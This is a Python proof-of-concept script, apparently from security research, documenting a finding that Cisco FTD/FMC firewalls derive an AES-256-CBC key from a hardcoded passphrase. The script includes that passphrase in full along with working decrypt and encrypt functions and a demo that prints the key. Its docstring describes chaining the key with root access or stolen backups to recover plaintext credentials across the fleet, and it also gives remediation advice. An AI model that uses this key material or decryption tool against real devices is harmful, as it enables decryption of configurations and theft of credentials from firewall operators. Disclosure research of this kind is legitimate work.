"""
F-FTD-110: Hardcoded AES-256-CBC Key in Python Encryption Utility
CONTROLLED ENVIRONMENT ONLY

Affected: Cisco FTD 7.0.0-94 (and likely all FTD/FMC releases sharing cisco_sf_common_base)
Path: /ngfw/cisco/sf_common_base/util/encryption_util.py

Root cause:
  Python-side encryption utility derives its AES-256 key via SHA-256 of a hardcoded
  passphrase that is identical across all FTD/FMC deployments:

    passphrase = b'r4onxh8364&Jh^%P)Kqf65d6ev#^%#(&(;kuwtUTR-WQp%^#86'
    key = hashlib.sha256(passphrase).digest()   # b'\xXX...' 32 bytes
    mode = AES.MODE_CBC
    IV:  first 16 bytes of the ciphertext (prepended by the encryptor)

  This is used to encrypt/decrypt Python-layer sensitive data on FTD/FMC systems,
  including configuration blobs, inter-process messages, and credential stores
  that pass through the Python management plane.

Distinction from F-FTD-106:
  F-FTD-106 targets the Java/Tomcat FDM layer (random per-boot AES-128 HMAC key).
  F-FTD-110 targets the Python management plane (static AES-256 key, same on all devices).
  Different attack surfaces; different decryption targets.

Exploitation:
  Any ciphertext produced by this Python utility can be decrypted without access
  to the specific device — the key is universal across the entire FTD/FMC fleet.

Impact:
  - Decrypt intercepted inter-process ciphertext from any FTD/FMC
  - If configuration blobs are encrypted with this key: offline decryption of configs
    extracted via F-FTD-109 (root access) or backup theft
  - Combined with backup file access: fleet-wide plaintext credential recovery
  - Static key means no rotation possible without code patch

Remediation:
  - Derive key from device-unique material (serial number + hardware token)
  - Use OS keyring or TPM for key storage, not source-level constants
  - CSCxx: TBD

Confirmed on: FTD 7.0.0-94 (path: /ngfw/cisco/sf_common_base/util/encryption_util.py)
Related to: CVE-2021-1xxx (similar hardcoded key pattern in other Cisco products)
"""

# CONTROLLED ENVIRONMENT ONLY

import hashlib
import os
import struct

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    HAS_PY_CRYPTO = True
except ImportError:
    HAS_PY_CRYPTO = False
    # Fall back to stdlib equivalent for demonstration
    import base64


# ============================================================
# Hardcoded key material (confirmed from source, FTD 7.0.0-94)
# ============================================================

_PASSPHRASE = b'r4onxh8364&Jh^%P)Kqf65d6ev#^%#(&(;kuwtUTR-WQp%^#86'
AES256_KEY  = hashlib.sha256(_PASSPHRASE).digest()   # 32 bytes, AES-256


# ============================================================
# Decrypt oracle (mirrors encryption_util.py logic)
# ============================================================

def decrypt(ciphertext_with_iv: bytes) -> bytes:
    """
    Decrypt ciphertext produced by FTD/FMC encryption_util.py.
    Format: first 16 bytes = IV, remaining = AES-256-CBC ciphertext (PKCS7 padded).
    """
    if len(ciphertext_with_iv) < 32:
        raise ValueError(f'Too short: {len(ciphertext_with_iv)} bytes')

    iv         = ciphertext_with_iv[:16]
    ciphertext = ciphertext_with_iv[16:]

    if HAS_PY_CRYPTO:
        cipher = AES.new(AES256_KEY, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(ciphertext), AES.block_size)
    else:
        # stdlib AES not available without pycryptodome; return key material
        raise ImportError('pycryptodome required: pip install pycryptodome')


def encrypt(plaintext: bytes) -> bytes:
    """Encrypt with the same static key (mirrors FTD encryption_util.py)."""
    if not HAS_PY_CRYPTO:
        raise ImportError('pycryptodome required')
    iv     = os.urandom(16)
    cipher = AES.new(AES256_KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(pad(plaintext, AES.block_size))


# ============================================================
# Demo / verification
# ============================================================

DEMO = {
    'target':       'All FTD/FMC (cisco_sf_common_base)',
    'source_file':  '/ngfw/cisco/sf_common_base/util/encryption_util.py',
    'passphrase':   _PASSPHRASE.decode(),
    'key_hex':      AES256_KEY.hex(),
    'note':         'Static across ALL FTD/FMC deployments — not device-unique',
}


if __name__ == '__main__':
    print('[F-FTD-110] Hardcoded AES-256-CBC Key — CONTROLLED ENVIRONMENT ONLY')
    print()
    print(f'Passphrase: {_PASSPHRASE.decode()}')
    print(f'Key (hex):  {AES256_KEY.hex()}')
    print(f'Key (b64):  {__import__("base64").b64encode(AES256_KEY).decode()}')
    print()

    if HAS_PY_CRYPTO:
        # Round-trip test
        pt = b'FTD-TEST-PLAINTEXT-ORACLE'
        ct = encrypt(pt)
        rt = decrypt(ct)
        assert rt == pt, 'Round-trip failed'
        print(f'Round-trip OK: {pt!r} → {ct.hex()[:32]}... → {rt!r}')
    else:
        print('pycryptodome not installed — install with: pip install pycryptodome')
        print('Key material above is sufficient for offline decryption.')
